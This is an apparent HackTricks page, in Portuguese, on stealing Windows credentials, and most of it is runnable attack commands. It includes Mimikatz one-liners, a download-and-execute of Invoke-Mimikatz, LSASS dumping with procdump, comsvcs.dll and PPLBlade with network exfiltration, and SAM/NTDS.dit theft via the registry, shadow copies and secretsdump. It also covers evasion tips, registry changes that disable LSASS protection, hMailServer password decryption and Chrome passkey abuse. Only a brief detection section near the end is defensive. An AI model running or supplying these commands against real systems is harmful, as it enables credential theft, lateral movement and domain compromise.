# Roubo de Credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais do Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Descubra outras coisas que o Mimikatz pode fazer [**nesta página**](credentials-mimikatz.md)**.

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saiba mais sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Estas proteções poderiam impedir que o Mimikatz extraísse algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** criei para **buscar senhas e hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Como o **Procdump da** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, ele não é detectado pelo Defender.\
Você pode usar essa ferramenta para **dump do processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** a partir do dump.

Você também pode usar o [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Esse processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Observação**: Alguns **AVs** podem **detectar** como **malicioso** o uso de **procdump.exe para fazer dump de lsass.exe**, pois estão **detectando** as strings **"procdump.exe" e "lsass.exe"**. Portanto, é mais **furtivo** passar como **argumento** o **PID** de lsass.exe para o procdump **em vez do** **nome lsass.exe.**

### Fazendo dump de lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll**, encontrada em `C:\Windows\System32`, é responsável por **fazer dump da memória de processos** em caso de falha. Essa DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo que será submetido ao dump constitui o primeiro componente, o local do arquivo de dump representa o segundo, e o terceiro componente deve ser estritamente a palavra **full**. Não existem opções alternativas.\
Após analisar esses três componentes, a DLL é acionada para criar o arquivo de dump e transferir para ele a memória do processo especificado.\
O uso da **comsvcs.dll** é viável para fazer dump do processo lsass, eliminando assim a necessidade de fazer upload e executar o procdump. Esse método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

O comando a seguir é usado para execução:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass com o Task Manager**

1. Clique com o botão direito na Barra de Tarefas e clique em Task Manager
2. Clique em More details
3. Procure o processo "Local Security Authority Process" na aba Processes
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Create dump file".

### Dumping lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binary assinado pela Microsoft que faz parte da suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta de Dump de Processos Protegidos que oferece suporte à ofuscação do dump de memória e à transferência para workstations remotas sem gravá-lo no disco.

**Principais funcionalidades**:

1. Contornar a proteção PPL
2. Ofuscar arquivos de dump de memória para evitar mecanismos de detecção baseados em assinaturas do Defender
3. Fazer upload do dump de memória usando métodos de upload RAW e SMB sem gravá-lo no disco (dump fileless)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dumping de LSASS baseado em SSP sem MiniDumpWriteDump

O Ink Dragon disponibiliza um dumper de três estágios chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, portanto os hooks de EDR nessa API nunca são acionados:<sup>[[3]](#references)</sup>

1. **Loader do estágio 1 (`lals.exe`)** – procura em `fdp.dll` um placeholder composto por 32 caracteres `d` minúsculos, sobrescreve-o com o caminho absoluto para `rtu.txt`, salva a DLL modificada como `nfdp.dll` e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força o **LSASS** a carregar a DLL maliciosa como um novo Security Support Provider (SSP).
2. **Estágio 2 dentro do LSASS** – quando o LSASS carrega `nfdp.dll`, a DLL lê `rtu.txt`, aplica XOR em cada byte com `0x20` e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Dumper do estágio 3** – o payload mapeado reimplementa a lógica do MiniDump usando **direct syscalls** resolvidos a partir de nomes de API com hash (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Uma exportação dedicada chamada `Tom` abre `%TEMP%\<pid>.ddt`, transmite um dump compactado do LSASS para o arquivo e fecha o handle para que a exfiltração possa ocorrer posteriormente.

Notas para o operador:

* Mantenha `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` no mesmo diretório. O estágio 1 reescreve o placeholder hard-coded com o caminho absoluto para `rtu.txt`, portanto separá-los interrompe a cadeia.
* O registro ocorre anexando `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Você pode inserir esse valor antecipadamente para fazer o LSASS recarregar o SSP a cada inicialização.
* Os arquivos `%TEMP%\*.ddt` são dumps compactados. Descompacte-os localmente e depois forneça-os ao Mimikatz/Volatility para extração de credenciais.
* Executar `lals.exe` requer direitos de admin/SeTcb para que `AddSecurityPackageA` seja bem-sucedido; quando a chamada retorna, o LSASS carrega transparentemente o SSP rogue e executa o estágio 2.
* Remover a DLL do disco não a expulsa do LSASS. Exclua a entrada do registro e reinicie o LSASS (reinicialização) ou deixe-a para obter persistência de longo prazo.

## CrackMapExec

### Despejar hashes SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump de secrets LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump do NTDS.dit do DC alvo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extrair o histórico de senhas do NTDS.dit do DC alvo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar o atributo pwdLastSet para cada conta do NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Roubo de SAM e SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Porém, **você não pode simplesmente copiá-los de maneira comum** porque eles são protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Você pode realizar cópias de arquivos protegidos usando este serviço. É necessário ser Administrador.

#### Using vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo no **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código do livro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Por fim, você também poderia usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia de SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, armazenando dados cruciais sobre objetos de usuário, grupos e suas associações. É nele que os **password hashes** dos usuários do domínio são armazenados. Esse arquivo é um banco de dados **Extensible Storage Engine (ESE)** e está localizado em **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro desse banco de dados, três tabelas principais são mantidas:

- **Data Table**: Esta tabela é responsável por armazenar detalhes sobre objetos, como usuários e grupos.
- **Link Table**: Mantém o controle dos relacionamentos, como associações de grupos.
- **SD Table**: Os **security descriptors** de cada objeto são armazenados aqui, garantindo a segurança e o controle de acesso dos objetos armazenados.

A pesquisa de Christoffer Andersson sobre a camada de banco de dados documenta essas tabelas e seu comportamento específico por versão em mais detalhes.<sup>[[8]](#references)</sup>

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo, e ele é usado pelo _lsass.exe_. Portanto, uma **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (provavelmente é possível encontrar os dados acessados mais recentemente devido à melhoria de desempenho obtida pelo uso de um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é criptografado três vezes:

1. Descriptografar a Password Encryption Key (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando a **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

A **PEK** tem o **mesmo valor em todos os controladores de domínio**, mas é **criptografada** dentro do **NTDS.dit** com a **BOOTKEY** específica do DC, obtida da hive **SYSTEM** desse controlador de domínio. Portanto, extrair credenciais requer tanto o **NTDS.dit** quanto o **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copiando o NTDS.dit usando o Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque de [**volume shadow copy**](#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**extraia-o do registro ou use o truque de volume shadow copy**](#stealing-sam-and-system)).

### **Extraindo hashes do NTDS.dit**

Depois de **obter** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extraí-las automaticamente** usando um usuário administrador de domínio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para arquivos **NTDS.dit grandes**, recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Por fim, você também pode usar o **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ou o **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Os objetos do NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas os segredos são extraídos, mas também os objetos completos e seus atributos para extração adicional de informações quando o arquivo NTDS.dit bruto já foi obtido.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O hive `SYSTEM` é opcional, mas permite a descriptografia de secrets (hashes NT e LM, credenciais suplementares, como cleartext passwords, chaves kerberos ou de trust, históricos de passwords NT e LM). Junto com outras informações, os seguintes dados são extraídos: contas de usuários e máquinas com seus hashes, flags de UAC, timestamp do último logon e alteração de password, descrição das contas, nomes, UPN, SPN, grupos e memberships recursivos, árvore e memberships das organizational units, domínios confiáveis com tipo, direção e atributos dos trusts...

## Lazagne

Baixe o binário [aqui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar esse binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e do LSASS

### Windows Credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Faça o download em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraia credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraia credenciais do arquivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Baixe-o em:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e simplesmente **execute-o**; as senhas serão extraídas.

## Minerando sessões RDP ociosas e enfraquecendo controles de segurança

O RAT FinalDraft da Ink Dragon inclui um tasker `DumpRDPHistory`, cujas técnicas são úteis para qualquer red-teamer:<sup>[[3]](#references)</sup>

### Coleta de telemetria no estilo DumpRDPHistory

* **Alvos RDP de saída** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint` e o timestamp da última gravação. Você pode replicar a lógica do FinalDraft com PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Evidências de RDP de entrada** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` em busca dos IDs de evento **21** (logon bem-sucedido) e **25** (desconexão) para mapear quem administrou a máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Depois de descobrir qual Domain Admin se conecta regularmente, faça o dump do LSASS (com LalsDumper/Mimikatz) enquanto a sessão **desconectada** ainda existir. O fallback do CredSSP + NTLM deixa o verificador e os tokens dessa conta no LSASS, que podem então ser reutilizados via SMB/WinRM para obter o `NTDS.dit` ou estabelecer persistência em controladores de domínio.

### Downgrades do Registry direcionados pelo FinalDraft

O mesmo implante também altera várias chaves do Registry para facilitar o roubo de credenciais:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Definir `DisableRestrictedAdmin=1` força o reuso completo de credenciais/tickets durante o RDP, permitindo pivôs no estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desabilita a filtragem de tokens do UAC, fazendo com que administradores locais obtenham tokens irrestritos pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador do DSRM faça logon enquanto o DC está online, fornecendo aos atacantes outra conta integrada com altos privilégios.
* `RunAsPPL=0` remove as proteções PPL do LSASS, tornando trivial o acesso à memória para dumpers como o LalsDumper.

## Credenciais do banco de dados do hMailServer (após o comprometimento)

O hMailServer armazena a senha do DB em `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, na seção `[Database] Password=`. O valor é criptografado com Blowfish usando a chave estática `THIS_KEY_IS_NOT_SECRET` e trocas de endianness de palavras de 4 bytes. Use a string hexadecimal do INI com este snippet Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Com a senha em texto claro, copie o banco de dados SQL CE para evitar bloqueios de arquivo, carregue o provider de 32 bits e faça o upgrade, se necessário, antes de consultar os hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
A coluna `accountpassword` usa o formato de hash do hMailServer (modo `1421` do hashcat). Quebrar esses valores pode fornecer credenciais reutilizáveis para pivots de WinRM/SSH.

## Interceptação do Callback de Logon da LSA (LsaApLogonUserEx2)

Algumas ferramentas capturam **senhas de logon em plaintext** interceptando o callback de logon da LSA `LsaApLogonUserEx2`. A ideia é fazer hook ou encapsular o callback do authentication package para que as credenciais sejam capturadas **durante o logon** (antes do hashing) e, em seguida, gravadas no disco ou retornadas ao operador. Isso é comumente implementado como um helper que injeta na LSA ou se registra nela e, então, registra cada evento de logon interativo/de rede bem-sucedido com o nome de usuário, o domínio e a senha.<sup>[[1]](#references)</sup>

Observações operacionais:
- Requer admin local/SYSTEM para carregar o helper no caminho de autenticação.
- As credenciais capturadas aparecem somente quando ocorre um logon (logon interativo, RDP, de serviço ou de rede, dependendo do hook).

## Credenciais de Conexão Salvas do SSMS (sqlstudio.bin)

O SQL Server Management Studio (SSMS) armazena as informações de conexão salvas em um arquivo `sqlstudio.bin` específico de cada usuário. Dumpers dedicados podem analisar o arquivo e recuperar credenciais SQL salvas. Em shells que retornam apenas a saída de comandos, o arquivo costuma ser exfiltrado codificando-o como Base64 e imprimindo-o em stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
No lado do operador, reconstrua o arquivo e execute o dumper localmente para recuperar credenciais:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Roubo de credenciais de Passkeys / WebAuthn do Chrome no Windows

Se for obtida execução de código como o **usuário vítima** em um host Windows usando **Chrome + Google Password Manager com passkeys sincronizadas**, as passkeys se tornam um alvo interessante de post-exploitation mesmo **sem admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefatos locais interessantes
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** armazena registros **`WebauthnCredentialSpecifics`** codificados em protobuf. Um processo do mesmo usuário pode enumerar o **RP ID**, o **nome de usuário**, o **ID da credencial** e o material da chave privada criptografada das passkeys sincronizadas.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** armazena o estado local de registro do dispositivo, como **`wrapped_identity_private_key`** e o segredo protegido usado para recuperar credenciais sincronizadas.<sup>[[4]](#references)</sup>

Triagem rápida:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Blobs de chaves vinculados ao TPM ainda podem ser abusados como um oracle de assinatura local

Se o navegador exportar uma chave de identidade respaldada pelo TPM como **`NCRYPT_OPAQUE_KEY_BLOB`** e armazenar esse blob em um estado acessível ao usuário, o malware **não** precisará extrair a chave privada bruta. Ele poderá simplesmente reimportar o blob na **mesma máquina** e solicitar que o TPM local assine dados controlados pelo atacante:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Isso significa que o **hardware binding impede a exportação para fora do dispositivo, mas não o uso pelo mesmo usuário no endpoint comprometido**.

### Caminhos práticos de abuso

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Enumerar `WebauthnCredentialSpecifics` a partir do LevelDB do Chrome.
- Iniciar um login com passkey e obter um novo challenge WebAuthn.
- Usar o blob `wrapped_identity_private_key` roubado no TPM da vítima para assinar o binding da solicitação do cloud-authenticator.
- Encaminhar a assertion retornada para o relying party.
- Isso é especialmente valioso quando o RP aceita `userVerification=preferred` ou não rejeita assertions com **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Forçar o re-onboarding excluindo `passkey_enclave_state` ou enviando uma operação `device/forget` assinada e válida.
- Se o onboarding deixar o dispositivo em **`uv_key_pending`**, registrar uma chave pública UV controlada pelo atacante.
- Se o provider não verificar a attestation / origem em secure hardware da nova chave UV, as assinaturas posteriores da chave do atacante serão tratadas como **`UV=1`**.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Forçar a recuperação ou a reintegração para que o Chrome obtenha o master secret das passkeys sincronizadas.
- Observar a recriação/modificação de `passkey_enclave_state` e, em seguida, fazer um dump da memória do Chrome enquanto o **security domain secret (SDS)** em texto claro estiver residente.
- Usar o SDS recuperado para descriptografar os campos criptografados em cada registro `WebauthnCredentialSpecifics` e recuperar chaves privadas WebAuthn portáveis.

### Ideias de DFIR / detecção

- Monitorar a **exclusão/recriação** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Gerar alertas para acesso anormal a **`Sync Data\LevelDB`** do Chrome por processos que não sejam navegadores.
- Gerar alertas para **memory dumps do Chrome** ou acesso suspeito à memória entre processos.
- Investigar prompts repetidos de **Google Password Manager recovery PIN** ou re-onboarding inesperado.
- Lembrar que o **`signCount`** do WebAuthn frequentemente não é útil para passkeys sincronizadas, pois pode permanecer constante; portanto, a detecção clássica de clones é fraca.

## References

- [1] [Unit 42 – Uma investigação sobre anos de operações não detectadas visando setores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing de macro VBA do Word via SMTP → descriptografia de credenciais do hMailServer → Veeam CVE-2023-27532 para SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: revelando a relay network e o funcionamento interno de uma operação ofensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: uma nova superfície de ataque na autenticação sem senha](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / armazenamento de chaves CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Como o armazenamento de dados do Active Directory realmente funciona: por dentro do NTDS.dit (Parte 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump remoto de senhas do LSASS](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
